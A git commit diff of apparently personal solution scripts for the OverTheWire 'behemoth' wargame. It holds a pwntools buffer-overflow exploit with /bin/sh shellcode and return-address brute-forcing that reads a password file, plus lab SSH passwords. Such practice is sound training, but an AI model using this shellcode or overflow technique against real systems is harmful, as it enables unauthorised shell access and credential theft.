233d09f2eebefa08822b37554f4d2fac28269510
whatsyourask <lexeymartynov@gmail.com>
2021-03-25 03:38:03 -0400

    Complete behemoth1, but can't do remote exploit, began behemoth2

--- OverTheWire/behemoth/behemoth1.py
+++ OverTheWire/behemoth/behemoth1.py
@@ -16,8 +16,21 @@ export EGG=$(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x
 '''
 
 con = ssh('behemoth1', 'behemoth.labs.overthewire.org', password='aesebootiv', port=2221)
-p = con.process('/behemoth/behemoth1', env={'EGG': "\x90" * 10000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"})
-p.sendline(b"A"*71 + p32(0xffffde7c))
-print(p.recv())
-print(p.recv())
-p.interactive()
+# 0xffffdec7
+ret_addr = 0xffffaa00
+password = None
+for i in range(ret_addr, ret_addr + 100000, 25):
+    p = con.process('/behemoth/behemoth1', env={'EGG': "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"})
+    print(p32(i))
+    p.sendline(b"A"*71 + p32(i))
+    try:
+        if password is not None:
+            break
+        p.recv()
+        p.recv()
+        print(p.recv())
+        p.sendline('cat /etc/behemoth_pass/behemoth2')
+        password = p.recv()
+    except EOFError:
+        pass
+print(password)
---
+++ OverTheWire/behemoth/behemoth2.py
@@ -0,0 +1,5 @@
+from pwn import *
+
+
+con = ssh('behemoth2', 'behemoth.labs.overthewire.org', password='eimahquuof', port=2221')
+
